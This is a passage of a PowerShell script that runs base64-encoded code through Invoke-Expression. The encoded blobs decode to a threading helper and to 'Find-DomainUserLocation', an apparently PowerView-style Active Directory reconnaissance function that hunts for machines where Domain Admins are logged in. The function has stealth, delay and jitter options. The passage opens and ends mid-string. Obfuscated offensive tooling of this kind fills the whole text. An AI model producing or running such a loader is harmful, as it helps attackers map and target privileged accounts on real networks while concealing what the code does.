J0aXRpb25zOiAkVGhyZWFkcyIKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXJOYW1lUGFydGl0aW9uIGluICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCkgewogICAgICAgICAgICAkUG93ZXJTaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgICAgICAgICAgJFBvd2VyU2hlbGwucnVuc3BhY2Vwb29sID0gJFBvb2wKICAgICAgICAgICAgJE51bGwgPSAkUG93ZXJTaGVsbC5BZGRTY3JpcHQoJFNjcmlwdEJsb2NrKS5BZGRQYXJhbWV0ZXIoJ0NvbXB1dGVyTmFtZScsICRDb21wdXRlck5hbWVQYXJ0aXRpb24pCiAgICAgICAgICAgIGlmICgkU2NyaXB0UGFyYW1ldGVycykgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFBhcmFtIGluICRTY3JpcHRQYXJhbWV0ZXJzLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgICAgICROdWxsID0gJFBvd2VyU2hlbGwuQWRkUGFyYW1ldGVyKCRQYXJhbS5OYW1lLCAkUGFyYW0uVmFsdWUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTRGF0YUNvbGxlY3Rpb25bT2JqZWN0XQogICAgICAgICAgICAkSm9icyArPSBAewogICAgICAgICAgICAgICAgUFMgPSAkUG93ZXJTaGVsbAogICAgICAgICAgICAgICAgT3V0cHV0ID0gJE91dHB1dAogICAgICAgICAgICAgICAgUmVzdWx0ID0gJE1ldGhvZC5JbnZva2UoJFBvd2VyU2hlbGwsIEAoJE51bGwsIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNEYXRhQ29sbGVjdGlvbltPYmplY3RdXSRPdXRwdXQpKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIFRocmVhZHMgZXhlY3V0aW5nIgogICAgICAgIERvIHsKICAgICAgICAgICAgRm9yRWFjaCAoJEpvYiBpbiAkSm9icykgewogICAgICAgICAgICAgICAgJEpvYi5PdXRwdXQuUmVhZEFsbCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMQogICAgICAgIH0KICAgICAgICBXaGlsZSAoKCRKb2JzIHwgV2hlcmUtT2JqZWN0IHsgLW5vdCAkXy5SZXN1bHQuSXNDb21wbGV0ZWQgfSkuQ291bnQgLWd0IDApCiAgICAgICAgJFNsZWVwU2Vjb25kcyA9IDEwMAogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gV2FpdGluZyAkU2xlZXBTZWNvbmRzIHNlY29uZHMgZm9yIGZpbmFsIGNsZWFudXAuLi4iCiAgICAgICAgZm9yICgkaT0wOyAkaSAtbHQgJFNsZWVwU2Vjb25kczsgJGkrKykgewogICAgICAgICAgICBGb3JFYWNoICgkSm9iIGluICRKb2JzKSB7CiAgICAgICAgICAgICAgICAkSm9iLk91dHB1dC5SZWFkQWxsKCkKICAgICAgICAgICAgICAgICRKb2IuUFMuRGlzcG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVMgMQogICAgICAgIH0KICAgICAgICAkUG9vbC5EaXNwb3NlKCkKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIGFsbCB0aHJlYWRzIGNvbXBsZXRlZCIKICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Eb21haW5Vc2VyTG9jYXRpb24gewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlckxvY2F0aW9uJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdVc2VyR3JvdXBJZGVudGl0eScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckxEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCiAgICAgICAgW0FsaWFzKCdVbmNvbnN0cmFpbmVkJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ29tcHV0ZXJVbmNvbnN0cmFpbmVkLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTaXRlTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2l0ZU5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXJJZGVudGl0eScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VySWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckxEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyU2VhcmNoQmFzZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVXNlckdyb3VwSWRlbnRpdHknKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnR3JvdXBOYW1lJywgJ0dyb3VwJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VyR3JvdXBJZGVudGl0eSA9ICdEb21haW4gQWRtaW5zJywKICAgICAgICBbQWxpYXMoJ0FkbWluQ291bnQnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VyQWRtaW5Db3VudCwKICAgICAgICBbQWxpYXMoJ0FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZXJBbGxvd0RlbGVnYXRpb24sCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ2hlY2tBY2Nlc3MsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1Nob3dBbGwnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRTaG93QWxsLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0ZWFsdGgsCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbVmFsaWRhdGVTZXQoJ0RGUycsICdEQycsICdGaWxlJywgJ0FsbCcpXQogICAgICAgICRTdGVhbHRoU291cmNlID0gJ0FsbCcsCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydVbmNvbnN0cmFpbmVkJ10gPSAkVW5jb25zdHJhaW5lZCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJFVzZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRVc2VyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBZG1pbkNvdW50J10gPSAkVXNlckFkbWluQ291bnQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBbGxvd0RlbGVnYXRpb24nXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBbGxvd0RlbGVnYXRpb24nXSA9ICRVc2VyQWxsb3dEZWxlZ2F0aW9uIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gQCgpCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJOYW1lJ10pIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEAoJENvbXB1dGVyTmFtZSkKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0ZWFsdGgnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBTdGVhbHRoIGVudW1lcmF0aW9uIHVzaW5nIHNvdXJjZTogJFN0ZWFsdGhTb3VyY2UiCiAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJBcnJheUxpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICAgICAgICAgICAgIGlmICgkU3RlYWx0aFNvdXJjZSAtbWF0Y2ggJ0ZpbGV8QWxsJykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIGZpbGUgc2VydmVycycKICAgICAgICAgICAgICAgICAgICAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckRvbWFpbiddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkQ29tcHV0ZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkRmlsZVNlcnZlcnMgPSBHZXQtRG9tYWluRmlsZVNlcnZlciBARmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgaWYgKCRGaWxlU2VydmVycyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsgJEZpbGVTZXJ2ZXJzID0gQCgkRmlsZVNlcnZlcnMpIH0KICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJBcnJheUxpc3QuQWRkUmFuZ2UoICRGaWxlU2VydmVycyApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFN0ZWFsdGhTb3VyY2UgLW1hdGNoICdERlN8QWxsJykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIERGUyBzZXJ2ZXJzJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRTdGVhbHRoU291cmNlIC1tYXRjaCAnREN8QWxsJykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIGRvbWFpbiBjb250cm9sbGVycycKICAgICAgICAgICAgICAgICAgICAkRENTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdMREFQJyA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICREQ1NlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRENTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJERDU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgICAgICAkRG9tYWluQ29udHJvbGxlcnMgPSBHZXQtRG9tYWluQ29udHJvbGxlciBARENTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCREb21haW5Db250cm9sbGVycyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsgJERvbWFpbkNvbnRyb2xsZXJzID0gQCgkRG9tYWluQ29udHJvbGxlcnMpIH0KICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJBcnJheUxpc3QuQWRkUmFuZ2UoICREb21haW5Db250cm9sbGVycyApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJFRhcmdldENvbXB1dGVyQXJyYXlMaXN0LlRvQXJyYXkoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBRdWVyeWluZyBmb3IgYWxsIGNvbXB1dGVycyBpbiB0aGUgZG9tYWluJwogICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJEN1cnJlbnRVc2VyID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5Vc2VyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEN1cnJlbnRVc2VyID0gKFtFbnZpcm9ubWVudF06OlVzZXJOYW1lKS5Ub0xvd2VyKCkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2hvd0FsbCddKSB7CiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEAoKQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckxEQVBGaWx0ZXInXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBZG1pbkNvdW50J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFsbG93RGVsZWdhdGlvbiddKSB7CiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEdldC1Eb21haW5Vc2VyIEBVc2VyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBzYW1hY2NvdW50bmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRVc2VyR3JvdXBJZGVudGl0eQogICAgICAgICAgICAgICAgJ1JlY3Vyc2UnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyRG9tYWluJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0